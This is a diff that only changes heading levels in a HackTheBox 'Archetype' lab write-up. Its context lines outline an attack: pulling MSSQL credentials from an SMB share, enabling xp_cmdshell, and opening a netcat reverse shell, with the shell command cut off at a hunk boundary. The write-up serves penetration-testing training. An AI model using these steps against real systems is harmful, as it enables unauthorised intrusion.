@@ -13,13 +13,13 @@ img_path: /assets/img/hackthebox/machines/archetype/
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Archetype](https://app.hackthebox.com/starting-point?tier=2) from [HackTheBox](https://www.hackthebox.com). It's an easy windows machines running SMB and MSSQL server, we find a share named backups that contains credentials for the MSSQL server. We authenticate to that server and enable command execution on it. We use that to upload a static netcat binary and get a reverse shell with that. The user/service we got the shell as has seimpersonateprivilege, and we find some credentials in powershell history file.
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 -Pn {target_IP}`.
 
@@ -85,7 +85,7 @@ Host script results:
 
 The target is a windows machine running SMB and MSSQLS (**M**icrosoft **SQL** **S**erver).
 
-## SMB
+### SMB
 
 Let's start by enumeration the smb server using the following command : `sudo smbclient -L 10.129.95.187`.
 
@@ -103,7 +103,7 @@ Let's see what's on the file.
 
 Found username and password for the mssql server.
 
-## MSSQL
+### MSSQL
 
 We can try to connect to the MSSQL server by using [Impacket](https://github.com/SecureAuthCorp/impacket)'s mssqlclient.py script along with the following flags:
 
@@ -116,7 +116,7 @@ Connect with the following command : `python3 mssqlclient.py ARCHETYPE/sql_svc@{
 We successfully authenticated to the Microsoft SQL Server!
 
 
-# **Foothold**
+## **Foothold**
 
 Running `help` shows us some very basic functionalities, doesn't help us much.
 
@@ -180,7 +180,7 @@ Now execute this following command to get a shell: `xp_cmdshell "powershell -c c
 
 Great! We got a reverse shell.
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Let's check our privileges on the machine by running `whoami /priv`
 
@@ -202,7 +202,7 @@ Great! We have successfully rooted this machine. Congratulations.
 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
 
-# References
+## References
 
 https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
 
